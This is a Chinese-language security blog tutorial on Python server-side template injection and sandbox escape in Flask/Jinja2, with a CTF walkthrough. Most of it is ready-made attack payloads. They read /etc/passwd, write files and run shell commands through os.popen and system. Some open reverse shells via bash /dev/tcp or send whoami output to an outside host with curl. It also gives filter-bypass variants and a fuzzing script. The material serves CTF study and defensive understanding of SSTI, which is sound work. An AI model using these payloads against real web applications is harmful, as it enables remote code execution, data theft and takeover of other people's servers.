# 浅析Python SSTI/沙盒逃逸

阅读量 **338477**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-01-29 14:30:10

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0152caccc32bd33a81.jpg)

## 前言

之前也接触过什么是SSTI，但大多以题目进行了解，很多模块以及payload都不了解其意就直接拿过来用，感觉并没有学到什么东西，最主要的是在绕过的过程中，不清楚原理没有办法构造,这次就好好来学习一下原理以及姿势

## 一、基础知识

###  0x00:沙盒逃逸

> 沙箱逃逸,就是在一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程

###  0x01:python的内建函数

> 启动python解释器时，即使没有创建任何变量或函数，还是会有很多函数可供使用，这些就是python的内建函数

在python交互模式下，使用命令`dir('builtins')`即可查看当前python版本的一些内建变量、内建函数

![](https://p1.ssl.qhimg.com/t0186fd65b8752e9678.png)

内建函数非常强大,可以调用一切函数

###  0x02:名称空间

内建函数是怎么工作的哪？就需要了解一下名称空间

python的名称空间，是从名称到对象的映射，在python程序的执行过程中，至少会存在两个名称空间。

> 1、内建名称空间：python自带的名字，在python解释器启动时产生，存放一些python内置的名字  
>  2、全局名称空间：在执行文件时，存放文件级别定义的名字  
>
> 3、局部名称空间（可能不存在）：在执行文件的过程中，如果调用了函数，则会产生该函数的名称空间，用来存放该函数内定义的名字，该名字在函数调用时生效，调用结束后失效

**加载顺序：**

  * 内置名称空间—>全局名称空间—>局部名称空间

**名字的查找顺序：**

  * 局部名称空间—>全局名称空间—>内置名称空间

在python中，初始的`builtins`模块提供内建名称空间到内建对象的映射

![](https://p3.ssl.qhimg.com/t0160be1947432fedbd.png)

在没有提供对象的时候，将会提供当前环境所导入的所有模块，不管是哪个版本,可以看到`__builtins__`是做为默认初始模块出现的，使用dir()命令查看一下`__builtins__`

![](https://p4.ssl.qhimg.com/t0159c4a62c906a6091.png)

可以看到有很多关键字

    
    
    __import__ open
    

这也就是为什么python解释器里能够直接使用某些函数的原因，加载顺序操作python解释器会自动执行，所以我们能直接看到一个函数被使用，如:使用print函数

![](https://p0.ssl.qhimg.com/t01f1609a7145cfa565.png)

###  0x03:类继承

上面了解了什么是名称空间，要学会构造SSTI的payload，还需要学习一下类继承，那什么是类继承那？

>
> python中一切均为对象，均继承于object对象，python的object类中集成了很多的基础函数，假如我们需要在payload中使用某个函数就需要用object去操作。

常见的继承关系的方法有以下三种：

  1. `__base__`:对象的一个基类，一般情况下是object
  2. `__mro__`:获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层所以在列表中的最后，通过`__mro__[-1]`可以获取到
  3. `__subclasses__()` :继承此对象的子类，返回一个列表

考察SSTI的CTF题目一般都是给个变量，因为有这些类继承的方法，便可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，这便是攻击方式：

    
    
    从变量->对象->基类->子类遍历->全局变量
    

找到我们想要的模块或者函数，然后进行构造payload。

###  0x04:常见payload分析

通过掌握上面的基础知识便可以来简单分析一下常见的payload，如：

    
    
    #python2
    ''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['os'].popen('ls').read()
    

先来了解一些内建属性的作用：

  1. `__class__` 返回调用的参数类型
  2. `__bases__` 返回类型列表
  3. `__globals__` 以字典类型返回当前位置的全部全局变量

将payload拆解下，一点一点来看

1、`''`返回的是字符串类型

![](https://p5.ssl.qhimg.com/t01e25f4988cc561cf0.png)

2、加上`__mro__`返回的是继承链关系

![](https://p1.ssl.qhimg.com/t012f9a93e321128c3a.png)

3、再添加上`__subclasses__()`返回的便是类的所有子类

![](https://p2.ssl.qhimg.com/t018b501486bc94c14f.png)

定位到需要的子类

![](https://p0.ssl.qhimg.com/t01f8bd95ea727af2d7.png)

4、接下来添加上 `__init__`用传入的参数来初始化实例，使用`__globals__`以字典返回内建模块

![](https://p1.ssl.qhimg.com/t0134e4a1da53581ed2.png)

5、调用成功，接下来就可以执行命令了

![](https://p2.ssl.qhimg.com/t015ee7a2149cdb474a.png)

如果是python3的话，那这个payload就需要重新修改，因为python3返回的不再是`site.Printer`类，而是`ContextVar`类

    
    
    ''.__class__.__mro__[-1].__subclasses__()[72]返回的是ContextVar类
    

![](https://p5.ssl.qhimg.com/t01a1dff0c3b1891110.png)

如果一个一个去找太麻烦，可以使用命令

    
    
    for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print (i)
    

将`__subclasses__()`每个字类都返回出来

![](https://p3.ssl.qhimg.com/t01f21e28b0130ca3c0.png)

这样便方便找到自己想要的子类

###  0x05:考察的Web框架及模板引擎

一般出SSTI题考察的 **Web框架有以下几种:**

  1. **flask**
  2. **Tornado**
  3. **Django**

因为每个框架涉及的知识都很多，这里就不再详细记录了，只记录一下在做题的时候可能会遇到的配置文件

**Tornado** ：`handler.settings`

> 这个是Tornado框架本身提供给程序员可快速访问的配置文件对象之一
    
    
    handler.settings-> RequestHandler.application.settings
    可以获取当前application.settings，从中获取到敏感信息
    

**[护网杯 2018]easy_tornado** 便考察了这个点

![](https://p2.ssl.qhimg.com/t01bececbccf24aa6b9.png)

**flaks：内置函数**

> config
> 是Flask模版中的一个全局对象，代表“当前配置对象(flask.config)”，是一个类字典的对象，包含了所有应用程序的配置值。在大多数情况下，包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。

  1. `url_for()` — 用于反向解析,生成url 
    1. `get_flashed_messages()` — 用于获取flash消息

    
    
    {{url_for.__globals__['__builtins__'].__import__('os').system('ls')}}
    

如果过滤了`{{config}}`且框架是`flask`的话便可以使用如下payload进行代替

    
    
    {{get_flashed_messages.__globals__['current_app'].config}}
    {{url_for.__globals__['current_app'].config}}
    

**shrine** 便考察了这个知识点

![](https://p4.ssl.qhimg.com/t014477304fb85ff635.png)

**模板引擎有以下几种：**

  1. **jinja2**
  2. **Twig**
  3. **Smarty(PHP)**
  4. **Mako**

要判断是哪个模板引擎，可以参考下图或者使用工具 **tplmap** 进行检测

![](https://p1.ssl.qhimg.com/t01aeb9951fb490d568.png)

###  0x06:Python常用的命令执行方式

**1、os.system()**

> 该方法的参数就是string类型的命令，在linux上，返回值为执行命令的exit值；而windows上，返回值则是运行命令后，shell的返回值。  
>  注意：该函数返回命令执行结果的返回值，并不是返回命令的执行输出（执行成功返回0，失败返回-1）

**2、os.popen()**

> 返回的是file read的对象，如果想获取执行命令的输出，则需要调用该对象的read()方法

## 二、姿势汇总

###  0x00:做题思考

一般遇到SSTI的题目时都是直接去搜现成的payload，然后进行套用，但有的时候考察的点或者是python环境不同，就可能出现上面的类差异，从而导致payload无法正常使用，解不出题来

所以在做题的时候就要思考，需要的是什么模块，比如想要os模块，那么就可以通过编写脚本查找os模块就会非常方便一些

**python2**

    
    
    num = 0
    for item in ''.__class__.__mro__[-1].__subclasses__():
        try:
            if 'os' in item.__init__.__globals__:
                print num,item
            num+=1
        except:
            num+=1
    

**python3**

> 原理相同，但是python3环境变化了，例如python2下有file而python3没有，所以直接用open。  
>  python3的利用主要索引在于 **builtins** ，找到了它便可以利用其中的eval、open等等来执行想要的操作
    
    
    #!/usr/bin/python3
    # coding=utf-8
    # python 3.5
    #jinja2模板
    from flask import Flask
    from jinja2 import Template
    # Some of special names
    searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__', '__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', "__instancecheck__", '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__','__mul__']
    neededFunction = ['eval', 'open', 'exec']
    pay = int(input("Payload?[1|0]"))
    for index, i in enumerate({}.__class__.__base__.__subclasses__()):
        for attr in searchList:
            if hasattr(i, attr):
                if eval('str(i.'+attr+')[1:9]') == 'function':
                    for goal in neededFunction:
                        if (eval('"'+goal+'" in i.'+attr+'.__globals__["__builtins__"].keys()')):
                            if pay != 1:
                                print(i.__name__,":", attr, goal)
                            else:
                                print("{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\") }}{% endif %}{% endfor %}")
    

###  0x01:常见payload

有现成的payload肯定用起来香啊，还是总结一些，方便之后自己再做类似的题目参考

**python2**

    
    
    #python2有file
    #读取密码
    ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
    #写文件
    ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil.txt', 'w').write('evil code')
    #OS模块
    system
    ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
    popen
    ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()
    #eval
    ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
    #__import__
    ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
    #反弹shell
    ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('bash -i >& /dev/tcp/你的服务器地址/端口 0>&1').read()
    ().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('bash -c "bash -i >& /dev/tcp/xxxx/9999 0>&1"')
    注意该Payload不能直接放在 URL 中执行 , 因为 & 的存在会导致 URL 解析出现错误，可以使用burp等工具
    #request.environ
    与服务器环境相关的对象字典
    

**python3**

    
    
    #python3没有file，用的是open
    #文件读取
    {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
    {{().__class__.__base__.__subclasses__[177].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("dir").read()')}}
    #命令执行
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
    [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls')
    

<https://github.com/payloadbox/ssti-payloads>

其他的就不再一一列举了，可以参考Github上的。

###  0x02:Bypass姿势

**拼接绕过**

    
    
    object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
    ().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()
    

**编码绕过**

    
    
    ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')]("X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=".decode('base64'))(
    #等价于
    ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")
    

**过滤中括号[]**

    
    
    #使用getitem()\pop()
    __mro__[2]== __mro__.__getitem__(2)
    ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
    

**过滤`{{或}}`**

使用`{%`进行绕过

    
    
    {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %}
    

**过滤_ 和引号**

**可以用`|attr`绕过**

    
    
    {{()|attr(request.values.a)}}&a=class
    

使用`request`对象绕过，假设过滤了`__class__`，可以使用下面的形式进行替代

    
    
    #1
    {{''[request.args.t1]}}&t1=__class__
    #若request.args改为request.values则利用post的方式进行传参
    #2
    {{''[request['args']['t1']]}}&t1=__class__
    #若使用POST，args换成form即可
    

**过滤.**

可以使用`attr()`或`[]`绕过

    
    
    #attr()
    {{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')}}
    #[]
    {{ config['__class__']['__init__']['__globals__']['os']['popen']('dir')['read']() }}
    

**reload**

如果`reload`可以用则可以重载，从而恢复内建函数

    
    
    reload(__builtins__)
    

## 三、题目实践

###  UNCTF2020-easyflask

![](https://p0.ssl.qhimg.com/t012b3dc9bfe1201260.png)

存在SSTI,先fuzz一下，看看都过滤什么

    
    
    import requests
    from time import sleep
    
    dic = ['config','class', 'bases','_','\'','subclasses', '[', '(', 'read', 'mro', 'init', 'globals', 'builtins', 'file', 'func_globals', 'linecache', 'system', 'values', 'import', 'module', 'call', 'name', 'getitem', 'pop', 'args', 'path', 'popen', 'eval', 'end', 'for', 'if', 'config']
    
    pass_dic = []
    
    for i in dic:
        url = "http://6f38b1e6-520d-47ff-a72b-14e481f513cb.node1.hackingfor.fun/secret_route_you_do_not_know?guess={}".format(i)       
        res = requests.get(url=url).text
        # print(res)
        # sleep(1)
        if 'black list filter' in res:
            pass_dic.append(i)
            print(pass_dic)
    

![](https://p5.ssl.qhimg.com/t0145f23b03aba64de2.png)

过滤了`' _ [
]`,那接下来就要思考怎么去构造payload了，上面总结的payload直接拿来用肯定会被过滤，因为大多数涉及到了`[`,但可以使用`|attr`和`request.args.xx`来绕过下划线和引号，只要明白原理，便可以使用上面的payload修改一下即可

    
    
    {{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')}}
    

拿这个payload进行修改之后

    
    
    {{()|attr(request.args.class)|attr(request.args.bases)|attr(request.args.subclasses)()|attr(request.args.getitem)(117)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.d)(request.args.e)(request.args.f)|attr(request.args.g)()}}&class=__class__&bases=__base__&subclasses=__subclasses__&getitem=__getitem__&init=__init__&globals=__globals__&d=get&e=popen&f=cat flag.txt&g=read
    

![](https://p0.ssl.qhimg.com/t018ba931d8d0795661.png)

payload有很多，只要能从基类获取到全局变量，之后一步一步调用就可以

## 参考博客

<https://blog.csdn.net/weixin_44604541/article/details/109048578>  
<https://www.anquanke.com/post/id/188172>  
<https://www.cnblogs.com/-chenxs/p/11971164.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Sn0w** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/228176](/post/id/228176)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [SSTI](/tag/SSTI)

 **+1** __5赞

 __收藏

![](https://p4.ssl.qhimg.com/t015b53550d07592c19.png) Sn0w

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

